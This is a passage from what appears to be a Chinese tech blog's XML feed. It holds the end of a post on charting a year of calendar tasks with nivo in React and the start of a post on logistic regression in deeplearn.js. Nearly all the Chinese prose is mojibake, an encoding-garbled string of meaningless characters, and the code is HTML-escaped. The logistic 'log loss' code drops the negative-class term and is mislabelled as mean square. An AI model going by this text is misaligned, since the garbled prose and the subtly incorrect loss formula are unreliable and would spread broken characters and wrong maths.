é–‹å§‹é€²è¡Œæˆ‘å€‘çš„åœ–è¡¨è£½ä½œå§ï¼åŸºæœ¬çš„æƒ³æ³•ä¸€æ¨£æ˜¯å°‡è³‡æ–™ç”¨ Calendar åœ–è¡¨å‘ˆç¾ï¼Œè§€å¯Ÿæ¯ç¨®é¡åˆ¥çš„ task åœ¨ä¸€å¹´ä¸­çš„åˆ†ä½ˆç‹€æ³ï¼Œä¸¦ä¸”åŠ å…¥å»å¹´çš„è³‡æ–™ä¾†åšå°æ¯”ã€‚
æ¥è‘—ï¼Œæƒ³åˆ©ç”¨ä¸€å€‹æŠ˜ç·šåœ–ä¾†è§€å¯Ÿå–®ä¸€é¡åˆ¥åœ¨æ¯å€‹æœˆçš„æ³¢å‹•ï¼Œæ˜¯ä¸æ˜¯åœ¨æŸäº›æœˆä»½æˆ‘æ¯”è¼ƒå‹¤å¥®å·¥ä½œã€æŸäº›æœˆä»½å¾ˆèªçœŸåœ¨é€²ä¿®æˆ–ç©æ¨‚ã€‚ç•¶ç„¶é€™äº›è³‡è¨Šå¾ Calendar åœ–è¡¨ä¹Ÿçœ‹å¾—å‡ºä¾†ï¼Œä½†æ˜¯ç”¨æœˆåŠ ç¸½çš„æ•¸å€¼å‘ˆç¾åœ¨æŠ˜ç·šåœ–ä¸Šï¼Œæ„Ÿè¦ºæœƒæ›´ç›´æ¥ä¸€é»ã€‚
æœ€å¾Œåœ¨æŠŠæ¯ç¨®é¡åˆ¥çš„è³‡æ–™é›†çµèµ·ä¾†ï¼Œåˆ©ç”¨ Waffle åœ–è¡¨ï¼Œä¸€ç›®ç­ç„¶å„å€‹é¡åˆ¥çš„æ¯”ä¾‹é—œä¿‚ã€‚
è¦é”æˆä¸Šé¢ä¸‰å€‹æƒ³æ³•ï¼Œæˆ‘å€‘åªéœ€è¦ä½¿ç”¨ nivo çš„ @nivo&#x2F;calendarã€@nivo&#x2F;line èˆ‡ @nivo&#x2F;waffle ä¸‰ç¨®å¥—ä»¶å³å¯ã€‚
ä½¿ç”¨æ–¹æ³•éƒ½å¾ˆç°¡å–®ï¼ŒåŸºæœ¬ä¸Šåªè¦åˆ°å°æ‡‰çš„ doc é é¢ï¼Œå°±ç›´æ¥æœ‰ç¾æˆçš„ç¨‹å¼ç¢¼å¯ä»¥è¤‡è£½åƒè€ƒã€‚
åƒæ˜¯ Calendar:

é‡é»åè€Œæ˜¯è³‡æ–™æ ¼å¼ï¼Œå³ä¾¿æˆ‘å€‘åªæ˜¯æƒ³ç¹ªè£½ä¸‰ç¨®åœ–è¡¨ï¼Œä½†å°±éœ€è¦æ•´ç†å‡ºä¸‰ç¨®è³‡æ–™æ ¼å¼ï¼Œæ‰èƒ½å¤ ç¬¦åˆå…¶å„è‡ªçš„éœ€æ±‚ï¼Œä¸€æ¨£å¯ä»¥å¾ nivo çš„ doc ä¸­æ‰¾åˆ°æ¯å€‹åœ–è¡¨æ‰€éœ€è¦çš„è³‡æ–™æ ¼å¼ï¼ˆdata tabï¼‰ã€‚
æˆ‘è£½ä½œç¯„ä¾‹çš„ parser æ”¾åœ¨ github ä¸Šï¼Œæœ‰èˆˆè¶£å¯ä»¥åƒè€ƒï¼Œä¸éå°±åªæ˜¯ä¸€äº›é«’é«’çš„è³‡æ–™è½‰æ›ï¼Œæ˜¯å€‹è€—æ™‚è²»åŠ›çš„å·¥ä½œå•Šâ€¦
å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé€™é‚Šæˆ‘é™¤äº†è½‰åŒ–è³‡æ–™æ ¼å¼å¤–ï¼Œé‚„èŠ±äº†ä¸å°‘æ™‚é–“åœ¨åšè³‡æ–™çš„æ•´ç†èˆ‡åŒæ­¥ã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿ
å› ç‚ºæ¯å¤©çš„æ—¥èªŒæ˜¯æˆ‘è‡ªå·±æ‰‹å‹•è¼¸å…¥ï¼Œé¡è‰² label ä¹Ÿæ˜¯æˆ‘è‡ªå·±æ¨™è¨˜ï¼Œæœ‰äº›äº‹é …çš„é¡åˆ¥åœ¨ 2017 å¹´èˆ‡ 2018 å¹´æˆ‘ç”¨çš„æ˜¯ä¸åŒçš„é¡è‰²ï¼Œä½†å»æ‡‰è©²æ˜¯åˆ†åœ¨åŒé¡ä¸­ï¼Œé€™åœ¨åšå°æ¯”æ™‚ï¼Œå°±æœƒæœ‰å•é¡Œäº†ï¼Œå› æ­¤èŠ±äº†ä¸å°‘æ™‚é–“å¾ 2017 å¹´ä¸€æœˆé–‹å§‹éåˆ° 2018 å¹´åäºŒæœˆâ€¦æ‰€ä»¥å¦‚æœæœ‰äººæƒ³è·Ÿæˆ‘ä¸€æ¨£é€™æ¨£ç´€éŒ„çš„è©±ï¼Œæˆ–è¨±å¯ä»¥ç”¨ Calendar å…§å»ºçš„åˆ†é¡åŠŸèƒ½ï¼Œè€Œä¸è¦åƒæˆ‘ä¸€æ¨£ç”¨æ‰‹å‹•æ¨™è¨˜é¡è‰²çš„æ–¹å¼ã€‚
ç¸½ä¹‹ï¼Œç•¶è³‡æ–™è™•ç†å¥½ä»¥å¾Œï¼Œç…§è‘—ç¶²ç«™ç¯„ä¾‹å°‡æˆ‘å€‘æƒ³è¦çš„å…ƒä»¶æ”¾åˆ°é é¢ä¸Šå³å¯ï¼Œé€™é‚Šæˆ‘æ˜¯ç›´æ¥ç”¨ CRA è£½ä½œ React SPAï¼Œå…¶ä¸­ Calendar çš„ä¾‹å­ï¼š
import React from &#x27;react&#x27;;import &#123; ResponsiveCalendar &#125; from &#x27;@nivo/calendar&#x27;const Calendar = (&#123;data&#125;) =&gt; (  &lt;ResponsiveCalendar        data=&#123;data&#125;        from=&quot;2017-01-01&quot;        to=&quot;2018-12-31&quot;        emptyColor=&quot;#eeeeee&quot;        colors=&#123;[            &quot;#61cdbb&quot;,            &quot;#97e3d5&quot;,            &quot;#e8c1a0&quot;,            &quot;#f47560&quot;        ]&#125;        margin=&#123;&#123;            &quot;top&quot;: 100,            &quot;right&quot;: 30,            &quot;bottom&quot;: 60,            &quot;left&quot;: 30        &#125;&#125;        yearSpacing=&#123;45&#125;        monthBorderColor=&quot;#ffffff&quot;        monthLegendOffset=&#123;10&#125;        dayBorderWidth=&#123;2&#125;        dayBorderColor=&quot;#ffffff&quot;        legends=&#123;[            &#123;                &quot;anchor&quot;: &quot;bottom-right&quot;,                &quot;direction&quot;: &quot;row&quot;,                &quot;translateY&quot;: 36,                &quot;itemCount&quot;: 4,                &quot;itemWidth&quot;: 34,                &quot;itemHeight&quot;: 36,                &quot;itemDirection&quot;: &quot;top-to-bottom&quot;            &#125;        ]&#125;    /&gt;);export default Calendar;

å¾ä¸Šé¢çš„ç¯„ä¾‹çœ‹å¾—å‡ºä¾†ï¼Œä½ æœ‰è¨±å¤š options å¯ä»¥è¨­å®šï¼Œåƒæ˜¯è³‡æ–™çš„èµ·å§‹æ—¥æœŸ(fromã€to)ã€è³‡æ–™é¡è‰²çš„å€é–“æˆ–æ˜¯å„ç¨® margin ç­‰éƒ½èƒ½èª¿æ•´ï¼Œéå¸¸æ–¹ä¾¿å¥½ç”¨ã€‚
å”¯ä¸€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ¡ç”¨æ”¯æ´ RWD çš„å…ƒä»¶ï¼ˆåƒæ˜¯é€™é‚Šç”¨çš„ ResponsiveCalendarï¼‰ï¼Œè¨˜å¾—è¦çµ¦å®šé€™å€‹ Component çš„ Parent component å›ºå®šçš„é«˜åº¦ï¼Œå¦å‰‡ nivo çš„å…ƒä»¶åµæ¸¬åˆ°é«˜åº¦ç‚ºé›¶æ™‚ï¼Œå°±ä¸æœƒ render äº†ï¼Œæ‰€ä»¥è¨˜å¾—è¦å¤šåŠ å€‹æœ‰é«˜åº¦çš„ Wrapper åœ¨ nivo çš„å…ƒä»¶ä¸Šã€‚
å…¶ä»–çš„å¯¦ä½œç´°ç¯€åŸºæœ¬ä¸Šå°±æ˜¯ React è€Œå·²ï¼ŒçœŸçš„æœ‰èˆˆè¶£ï¼ˆæƒ³çœ‹çœ‹ code æœ‰å¤šé³¥ï¼‰å¯ä»¥åˆ° github ç§ç§ã€‚
æœ€å¾Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„å¹´çµ‚æª¢è¨æˆ‘è¨˜éŒ„åœ¨ Google Calendar ä¸Šçš„ taskï¼ŒåŸºæœ¬ä¸Šåˆ†ç‚ºå…­é¡ï¼š

English - åŒ…å«ä¸Šè‹±æ–‡ç·šä¸Šèª²ç¨‹ã€èƒŒå–®å­—ã€å”¸è‹±æ–‡ç­‰
Entertainment - æ‰€æœ‰å¨›æ¨‚äº‹é …
Sick&#x2F;Rehabilitation - ç”Ÿç—…ã€åšç‰©ç†å¾©å¥
Exercise - é‹å‹•
Training - ä¸€åˆ‡æˆ‘èªç‚ºè·ŸåŠ å¼·æˆ‘è‡ªèº«å¯¦åŠ›æœ‰é—œçš„äº‹ï¼Œæœ‰å¯èƒ½æ˜¯çœ‹æ–‡ç« ã€å¯« code æˆ–æ˜¯åˆ·é¡Œ
Work - ä¸Šç­


Waffle åœ–çš„æ•¸æ“šæ˜¯æˆ‘å°‡æ¯å€‹æœˆçš„åˆ†é¡ task åŠ ç¸½å¾Œåšå¹³å‡æ‰€ç®—å‡ºçš„æ¯”ä¾‹ã€‚
è€Œå¾ Waffle åœ–å¯ä»¥å¾ˆæ˜é¡¯çœ‹åˆ°ï¼Œ2018 å¹´æˆ‘å°æ–¼ Training èˆ‡ English é€™å…©éƒ¨åˆ†çš„åˆ†é¡ï¼ŒåŠ é‡äº†ä¸å°‘ã€‚å›æƒ³éå»åŠå¹´ï¼Œå¾ˆæ€¥åˆ‡çš„æƒ³è¦æœ‰æ‰€çªç ´ï¼Œé›–ç„¶æˆ‘ä¸è¦ºå¾—æœ‰é”åˆ°æˆ‘å¿ƒä¸­çš„åŠªåŠ›ç¨‹åº¦ï¼Œä½†ä»¥çµæœè«–ä¾†èªªï¼Œé€™äº›å¤šå‡ºçš„ Training æˆ–è¨±çœŸçš„å¹«åŠ©äº†æˆ‘ï¼Œè®“æˆ‘åœ¨ä»Šå¹´é”æˆäº†äººç”Ÿä¸­ä¸€å€‹å°å°çš„ç›®æ¨™ï¼Œæœ‰äº†é€ƒé›¢é¬¼å³¶å‰å¾€æµ·å¤–çš„æ©Ÿæœƒã€‚
è‹¥æ˜¯å¾ Calendar åœ–èˆ‡æŠ˜ç·šåœ–ä¾†åšå…©å€‹å¹´åº¦çš„å°æ¯”ï¼Œæ„Ÿå—æœƒæ›´æ·±ä¸€é»ï¼š

é¦–å…ˆï¼Œå»å¹´åšå®Œ year end review å¾Œï¼Œæˆ‘å°±ç™¼ç¾å‡æ—¥ä¹Ÿåœ¨å·¥ä½œçš„æ™‚é–“æœ‰é»å¤ªå¤šï¼Œé™¤äº†æœ‰äº›æ™‚å€™çš„ç¢ºæ˜¯ project è¼ƒç‚ºå¿™ç¢Œï¼Œä½†å¤§å¤šæ˜¯è‡ªå·±å¹³æ—¥ä¸Šç­å°ˆæ³¨åŠ›æ²’æœ‰å¥½å¥½ç™¼æ®ã€‚
å› æ­¤ä»Šå¹´é–‹å§‹ï¼Œæˆ‘èª¿æ•´ä½œæ¯ï¼Œé™¤äº†æ—©ä¸Šé‹å‹•å¤–ï¼Œä¹Ÿç›¡é‡åœ¨å…¬å¸æ™‚ä¿æŒå°ˆæ³¨ï¼Œé™ä½èˆ‡ç¤¾ç¾¤åª’é«”çš„æ¥è§¸ï¼Œå¾åœ–è¡¨çµæœä¾†çœ‹ï¼Œæˆæ•ˆæŒºå¥½çš„ï¼Œæ˜é¡¯çœ‹åˆ° 2018 å¹´çš„å‡æ—¥åœ¨ Work é€™å€‹åˆ†é¡ï¼Œæ˜¯æ¯”è¼ƒç©ºçš„ã€‚
å¦å¤–ï¼ŒTraining èˆ‡ English åˆ†é¡çš„å·®ç•°å¾ Calendar åœ–è¡¨éå¸¸æ˜é¡¯å•Šï¼
2018 æˆ‘å¹¾ä¹æ¯å¤©éƒ½æœ‰æŠ½å‡ºä¸€é»æ™‚é–“å­¸ç¿’å·¥ä½œå¤–çš„äº‹ï¼ŒæŒçºŒç·´è‹±æ–‡çš„æ™‚é–“ä¹Ÿè®Šå¤šäº†ï¼
çµè«–åœ¨è£½ä½œç¬¬ä¸€å¹´çš„ Year End Review æ™‚ï¼Œåªæ˜¯è¦ºå¾—å¥½ç©ï¼Œå¯ä»¥æŠŠç´€éŒ„ä¸€å¹´çš„è³‡æ–™åšå€‹æ•´ç†è·Ÿè¦–è¦ºåŒ–å‘ˆç¾ï¼Œä½†åˆ°äº†ç¬¬äºŒå¹´ï¼Œæœ‰äº†å°ç…§å¾Œï¼Œå¥½åƒçœŸçš„å¯ä»¥å¾ä¸­çœ‹å‡ºè‡ªå·±ä¸€å¹´ä¾†çš„æˆé•·ï¼Œä¹Ÿåœ¨æ•´ç†è³‡æ–™çš„éç¨‹ä¸­ï¼Œå›é¡§äº†é€™ä¸€å¹´æ‰€åšçš„äº‹æƒ…ï¼Œä¸¦åçœè‡ªå·±çš„ç¼ºå¤±ã€‚é›–ç„¶æ•´é«”ä¸Šä¾†èªªï¼Œé‚„æ˜¯è¦ºå¾—è‡ªå·±æµªè²»äº†è¨±å¤šæ™‚é–“ï¼Œä½†å¥—å¥æç¬‘ä¾†çš„è©±ï¼šã€æ‰€æœ‰å°æ–¼ç¾ç‹€çš„è§£è„«ï¼Œæœ€çµ‚éƒ½åªèƒ½é ç©ç´¯ä¾†å¯¦ç¾ã€‚ã€å¾ç¾åœ¨é–‹å§‹ç¹¼çºŒåŠªåŠ›ã€ç¹¼çºŒç©ç´¯ï¼Œæ´»åœ¨æœªä¾†ï¼
è³‡æ–™ä¾†æº
nivo
ä¸€èµ·ç”¨ Google Calendar èˆ‡ D3.js é€²è¡Œå¹´çµ‚å›é¡§å§ï¼

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>data</tag>
        <tag>visualization</tag>
        <tag>nivo</tag>
        <tag>google calendar</tag>
        <tag>yearend</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Javascript é€²è¡Œé‚è¼¯è¿´æ­¸åˆ†æ</title>
    <url>/2018/04/07/deeplearnjs-logistic-regression/</url>
    <content><![CDATA[å‰è¨€ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å€‘åˆ©ç”¨ Deeplearn.js å­¸ç¿’äº† linear regressionï¼Œå¾æ°£æº«èˆ‡ç´…èŒ¶çš„é—œè¯æ€§ä¸­é æ¸¬éŠ·é‡ï¼Œé€™æ¬¡å°±ä¾†ç·´ç¿’åœ¨æ©Ÿå™¨å­¸ç¿’ä¸­å¦ä¸€å€‹å¾ˆåŸºæœ¬çš„æ–¹æ³• - Logistic regressionï¼ˆé‚è¼¯åˆ†æï¼‰ã€‚
å…ˆä¾†å¼µ Demo æˆæœåœ–ï¼š
 
å¾æˆæœåœ–ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ‰€è¬‚çš„ Logistic regression èˆ‡ Linear regression æœ€å¤§ä¸åŒå°±æ˜¯ï¼Œé‚è¼¯å›æ­¸å¤§å¤šç”¨ä¾†é€²è¡Œåˆ†é¡ï¼Œç•¶çµæœåªæœ‰å…©ç¨®æ™‚ï¼Œå°±æ˜¯äºŒå…ƒåˆ†é¡ï¼Œç•¶ç„¶ä¹Ÿæœ‰å¤šå…ƒåˆ†é¡ï¼Œé€™é‚Šä»¥ç°¡å–®äºŒå…ƒåˆ†é¡ä¾†åšç·´ç¿’ã€‚é€™æ¬¡çš„ç¯„ä¾‹åƒè€ƒè‡ª ã€webAIã€‘deeplearn.jsçš„é‚è¼¯å›æ­¸
å‡ºç™¼ç¸½è¦æœ‰å€‹æ–¹å‘ï¼Œåšå¯¦é©—ç¸½è¦æœ‰å€‹æƒ³åƒé‚„è¨˜å¾—å°æ™‚å€™å‰›äº†è§£æ™ºå•†çš„æ¦‚å¿µæ™‚ï¼Œå¾ˆå–œæ­¡å»æŸ¥æŸ¥åäººå€‘çš„æ™ºå•†æ•¸å­—ï¼Œåƒæ˜¯æ„›å› æ–¯å¦ã€å‰ç¾åœ‹ç¸½çµ±å¸ƒå¸Œç­‰ç­‰ï¼Œæƒ³çœ‹çœ‹é€™äº›åäººçš„æ™ºå•†æ˜¯å¤šå°‘ï¼Œæ˜¯ä¸æ˜¯çœŸçš„å¾ˆè°æ˜æ‰èƒ½åƒä»–å€‘é€™æ¨£æˆåŠŸã€‚ä»Šå¤©å‡è¨­æˆ‘å€‘æœ‰ä¸€ç¾¤äººçš„æ™ºå•†è³‡æ–™ï¼Œç¾åœ¨æƒ³è¦åˆ©ç”¨é€™äº›è³‡æ–™åˆ†å‰²å‡ºè°æ˜äººèˆ‡ç¬¨è›‹å…©å€‹åˆ†é¡ï¼Œè®“æˆ‘å€‘ä¹‹å¾Œå¯ä»¥ç”¨ä¾†åˆ¤æ–·ä¸€å€‹äººæ˜¯è°æ˜çš„ç‡é«˜ä¸€äº›ï¼Œæˆ–æ˜¯æ„šæ˜§æ©Ÿç‡é«˜ä¸€é»ï¼Œé‚£æˆ‘å€‘è©²æ€éº¼åšå‘¢ï¼Ÿ
é€™æ™‚å€™å°±å¯ä»¥å‡ºå‹• Logistic regression ä¾†å¹«æˆ‘å€‘è¨ˆç®—å‡ºä¸€å€‹é æ¸¬æ¨¡å‹ï¼Œç”¨ä¾†åˆ¤æ–·è©²äººçš„æ™ºå•†å±¬æ–¼å“ªå€‹åˆ†é¡çš„æ©Ÿç‡æ¯”è¼ƒé«˜ã€‚
ä»¥è¿´æ­¸åˆ†æä¾†èªªï¼Œæˆ‘å€‘æ˜¯å¸Œæœ›èƒ½ç”±çµ¦å®šä¸€å€‹å›ºå®šçš„è§£é‡‹è®Šæ•¸ Xï¼Œç„¶å¾Œæ±‚å‡ºç›®æ¨™è®Šæ•¸ Y çš„å¹³å‡å€¼ï¼Œæ˜¯æ¢ä»¶æœŸæœ›å€¼çš„æ¦‚å¿µï¼Œè‹¥ Y çš„çµæœæ˜¯é€£çºŒæ€§çš„ï¼Œæˆ‘å€‘å°±èƒ½è©¦è‘—é€éç·šæ€§æ¨¡å‹å»é€¼è¿‘ä¸€å€‹å‰›å¥½ç¬¦åˆæ‰€æœ‰è³‡æ–™çš„å…¬å¼ã€‚åƒæ˜¯ä¸Šä¸€æ¬¡çš„ç¯„ä¾‹ä¸­ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ç·šæ€§æ¨¡å‹æ±‚å‡ºåœ¨å„ç¨®æº«åº¦ä¸‹ï¼Œç´…èŒ¶çš„éŠ·å”®ç‹€æ³å¤§ç´„æœƒæ˜¯å¤šå°‘ã€‚
ä½†æœ‰äº›æ™‚å€™ï¼Œæƒ³æ±‚å¾—çš„ç›®æ¨™è®Šæ•¸æ˜¯äºŒå…ƒæˆ–æ˜¯å¤šå…ƒçš„è®Šæ•¸ï¼Œåƒæ˜¯å‰›å‰›ä¾‹å­ä¸­çš„è°æ˜ æˆ– ç¬¨è›‹ã€‚å¦‚æœç¡¬è¦ç”¨ç·šæ€§å‡½æ•¸å»é€¼è¿‘çš„è©±ï¼Œæ±‚å¾—çš„çµæœé€šå¸¸æœƒå¾ˆå·®ï¼Œåƒæ˜¯ä¸‹åœ–é€™èˆ¬ï¼š
(åœ–ç‰‡ä¾†æº)
æ‰€ä»¥æ‰æœ‰äººæå‡ºç”¨ sigmoid é€™å€‹èƒ½å°‡æ•¸å€¼ä¾·é™åœ¨ 0 èˆ‡ 1 ä¹‹é–“çš„å‡½æ•¸ä¾†è§£æ±ºé€™å€‹å•é¡Œï¼š

ä¸Šåœ–å°±æ˜¯ä¸€å€‹ sigmoid functionï¼Œå‡è¨­æˆ‘å€‘ä»Šå¤©åˆ¤æ–·æ™ºå•† 180 ä»£è¡¨æ©Ÿç‡ 1 çš„ç‹€æ³ï¼Œè€Œå¤§æ–¼æ©Ÿç‡ 0.6 æ™‚ï¼Œå°±å¯ä»¥ç®—æ˜¯è°æ˜äººï¼ˆé»ƒè‰²å€åŸŸï¼‰ï¼Œè€Œå°æ–¼ 0.6 çš„å‰‡å±¬æ–¼ç¬¨è›‹ï¼ˆç¶ è‰²å€åŸŸï¼‰ï¼Œé‚£ä»Šå¤©æˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯è¦æ‰¾å‡ºä¸€å€‹ ï¼¸ è»¸ä¸Šçš„ Z å€¼ï¼Œè®“æˆ‘å€‘èƒ½æ ¹æ“š input çš„ X ç‰¹å¾µå€¼ä¾†åˆ¤æ–·ï¼Œè‹¥æ˜¯ X å¤§æ–¼ Z æ™‚ï¼Œå°±å¯èªªä»–æ˜¯è°æ˜äººï¼ˆå› ç‚ºæ©Ÿç‡é«˜æ–¼ 0.6ï¼‰ã€‚
é€™å€‹è®“æˆ‘å€‘æ‰¾å‡º Z å€¼çš„å‡½æ•¸å°±æ˜¯æˆ‘å€‘è¦æ‰¾çš„ Decision Boundaryï¼Œä¹Ÿå°±æ˜¯é–‹é ­ Demo åœ–ä¸­çš„é‚£æ¢é»ƒè‰²ç·šæ®µï¼
æœ‰é—œæ–¼ Logistion regression èˆ‡ Decision Boundary çš„è©³ç´°å…§å®¹ï¼Œæˆ‘æ¨è–¦å¤§å®¶é–±è®€é€™å¹¾ç¯‡ blogï¼Œä»‹ç´¹å¾—å¾ˆç°¡å–®æ˜“æ‡‚ï¼š
Machine Learning å­¸ç¿’æ—¥è¨˜ä½ å¯èƒ½ä¸çŸ¥é“çš„é‚è¼¯è¿´æ­¸
å¤§æ¦‚äº†è§£ Logistic å¾Œï¼Œé‚£å°±ä¾†åˆ©ç”¨ deeplearn.js æ‰¾å‡º Decision Boundary å§!èµ·æ‰‹å¼ï¼Œå…ˆä¾†è£½ä½œå€‹å‡è³‡æ–™ï¼š
// å»ºç«‹å‡è³‡æ–™ï¼Œ1 ä»£è¡¨æ™ºå•† 100 åˆ†ä»¥ä¸Šï¼Œ0 ä»£è¡¨æ™ºå•† 100 åˆ†ä»¥ä¸‹const data = [] for (let i=0; i&lt;200; i++) &#123;    let tmpX1 = Math.random() * 120 + 60;    let tmpX2 = Math.random() * 120 + 60;    data.push(&#123;        x: tmpX1,        y: tmpX2,        c: tmpX1 &gt; 100 &amp;&amp; tmpX2 &gt; 100 ? 1: 0    &#125;);&#125;

æˆ‘å€‘éš¨æ©Ÿç”¢ç”Ÿ 200 çµ„ training dataï¼Œtmp_x èˆ‡ tmp_y å¯ä»¥ç•¶ä½œæˆ‘å€‘è¦è¼¸å…¥çš„ Input ç‰¹å¾µ X å‘é‡ï¼Œä»£è¡¨ä¸€å€‹äººçš„æ™ºå•†ä»¥åŠä»–é–±è®€çš„æ›¸ç±é‡ã€‚
æ¥è‘—åˆå§‹ deeplearn.js çš„è³‡æ–™çµæ§‹ï¼š
/** * deeplearn.js é‹ç®— */const x_list = [];const y_list = [];for (let elem of data) &#123;    x_list.push([elem.x, elem.y]);    y_list.push(elem.c);&#125;const x_data = dl.tensor2d(x_list);const y_data = dl.tensor2d(y_list);

å†æ¬¡ä»‹ç´¹ä¸€ä¸‹ï¼Œåœ¨ deeplearn.js ä¸­ï¼Œtensor æ˜¯æœ€æ ¸å¿ƒçš„è³‡æ–™çµæ§‹ï¼Œç”¨ä¾†è¡¨ç¤ºå‘é‡ã€çŸ©é™£æˆ–æ˜¯å¤šç¶­åº¦çš„è³‡æ–™ã€‚
æœ‰è¨±å¤š utility function å¯ä»¥è¼”åŠ©å‰µå»º tensor è³‡æ–™çµæ§‹ï¼Œåƒæ˜¯é€™é‚Šç”¨çš„æ˜¯ tensor2dï¼Œä¹Ÿå°±æ˜¯ 2D (2-dimension) çš„ tensorã€‚
ä¸€å€‹ tensor å…¶å¯¦åŒ…å«ä¸‰å€‹æˆåˆ†ï¼Œä¹Ÿæ˜¯å‰µå»º tensor æ™‚å¯ä»¥å‚³å…¥çš„åƒæ•¸ï¼š

values (TypedArray|Array): tensor çš„å€¼ã€‚å¯ä»¥æ˜¯ nested array æˆ– flat array çš„çµæ§‹ã€‚

shapeï¼ˆnumber[]ï¼‰:åŸºæœ¬ä¸Šå°±æ˜¯è©² tensor çš„ç¶­åº¦ã€‚è‹¥å‰µå»º tensor æ™‚æ²’æœ‰æŒ‡å®šç¶­åº¦ï¼Œå°±æœƒç¹¼æ‰¿å‚³å…¥çš„ values ç¶­åº¦ã€‚ä¹Ÿå¯ä»¥åƒé€™é‚Šçš„ç¯„ä¾‹ä¸€æ¨£ç›´æ¥ä½¿ç”¨ tensor$&#123;1|2|3|4&#125;d ä¾†å‰µå»º

dtypeï¼ˆfloat32â€™|â€™int32â€™|â€™boolï¼‰ï¼šå€¼çš„å‹åˆ¥ï¼Œç•¶ç„¶æ˜¯ optionalã€‚


ç”±æ–¼æˆ‘å€‘è¦è¨ˆç®—çš„ X éƒ½æ˜¯ä¸€çµ„å‘é‡ï¼Œæ‰€ä»¥é€™é‚Šä½¿ç”¨ dl.tensor2d ä¾†å»ºç½®ä¸€å€‹äºŒç¶­çš„ tensorã€‚
æ¥è‘—å®šç¾©æˆ‘å€‘è¦ training çš„ä¿‚æ•¸ï¼Œé€™é‚Šå–ç‚º W èˆ‡ Bï¼š
// æ¬Šé‡ W èˆ‡åå·® Bconst W = dl.variable(dl.zeros([1, 2]));const B = dl.variable(dl.zeros([1]));

dl.variable(initialValue, trainable?, name?, dtype?) ç”¨ä¾†å‰µå»º training éç¨‹ä¸­éœ€è¦çš„è®Šæ•¸ï¼Œä¹Ÿå¯é€éåƒæ•¸æŒ‡å®šè©²è®Šæ•¸èƒ½å¦åœ¨ training éç¨‹ä¸­è¢«ä¿®æ”¹ï¼ˆtrainableï¼‰ï¼Œé è¨­æ˜¯ trueã€‚
ç”¨ dl.zeros([1, 2]) ä¾†å‰µå»ºä¸€å€‹ Shape ç‚º [1,2] çš„å¡«æ»¿é›¶å€¼çš„ tensor è®Šæ•¸ç•¶æ¬Šé‡ Wï¼Œä»¥åŠç¶­åº¦ 1 çš„åå·®è®Šæ•¸ tensor Bã€‚
å†ä¾†éœ€è¦å®šç¾©ç›®æ¨™å‡½æ•¸èˆ‡ loss functionï¼š
// å®šç¾©ç›®æ¨™å‡½æ•¸ èˆ‡ loss function ï¼ˆæœ€ä¸€èˆ¬çš„ mean squareï¼‰// logistic regression æ¨¡å‹const f = x =&gt; dl.sigmoid(W.matMul(x.transpose()));// loss functionï¼ˆlog lossï¼‰const loss = (pred, label) =&gt; dl.mean(dl.neg(dl.sum(dl.mul(label, dl.log(pred)))));

ç›®æ¨™å‡½æ•¸çš„éƒ¨åˆ†å…¶å¯¦å°±æ˜¯å¸¶å…¥å…ˆå‰æ‰€æçš„ sigmoid functionï¼š

Z å°±æ˜¯æˆ‘å€‘è¦æ‰¾çš„ boundaryï¼Œå°±æ˜¯æ¬Šé‡èˆ‡ input X å‘é‡åšçŸ©é™£ä¹˜æ³•ï¼Œæ‰€ä»¥é€™è£¡éœ€è¦è½‰ç½®çŸ©é™£ x.transpose()ã€‚dl.sigmoid() å°±æ˜¯ deeplearn.js æä¾›çš„ sigmoid å‡½æ•¸ï¼ˆå¦‚ä¸Šåœ–ç¬¬äºŒè¡Œï¼‰
å°‡ Z å¸¶å…¥ dl.sigmoid() å¾Œå°±ç²å¾—äº†ç›®æ¨™å‡½æ•¸ fã€‚
è€Œ loss function çš„è©±ï¼Œä¸€èˆ¬åœ¨ logistic function éƒ½æ˜¯æ¡ç”¨ log loss çš„å…¬å¼ï¼Œè©³ç´°è§£é‡‹èˆ‡å…¬å¼æ¨å°æ¨è–¦é–±è®€æ­¤ç¯‡ï¼šç”¨äººè©±è§£é‡‹æ©Ÿå™¨å­¸ç¿’ä¸­çš„ Logistic Regression
ç…§è‘—å…¬å¼å¾ˆå®¹æ˜“å°±å¯ä»¥å¸¶å‡ºä¸Šè¿°çš„ loss()ã€‚
æœ€å¾Œå°±å¯ä»¥é–‹å§‹ training æˆ‘å€‘çš„ data å•¦ï¼š
// æ¢¯åº¦å„ªåŒ–const learningRate = 0.001const optimizer = dl.train.sgd(learningRate)// Training!for (let i = 0; i &lt; 1000; i++) &#123;    optimizer.minimize(() =&gt; loss(f(x_data), y_data))&#125;

è·Ÿä¸Šä¸€ç¯‡ linear regression ç›¸åŒï¼Œæˆ‘å€‘æ¡ç”¨dl.train.sgdï¼Œæ˜¯ deeplearn.js å…§å»ºçš„ sgd æ¼”ç®—æ³•æ¨¡å‹ï¼Œæ¥å—ä¸€å€‹ leanring rate åƒæ•¸ã€‚åœ¨æ¯ä¸€æ¬¡çš„è¿­ä»£ä¸­ï¼Œä¿‚æ•¸éƒ½æœƒä¸æ–·è¢«æ›´æ–°ï¼Œä»¥æ‰¾å‡ºæœ€ä½³çš„çµæœï¼Œè€Œé€™å€‹ learningRate åƒæ•¸æ˜¯ç”¨ä¾†æ§åˆ¶æ¯ä¸€æ¬¡çš„æ›´æ–°å¹…åº¦ã€‚å› æ­¤ä¸èƒ½å¤ è¨­å¾—å¤ªå¤§ï¼Œä¹Ÿä¸èƒ½è¨­å¾—å¤ªå°ã€‚
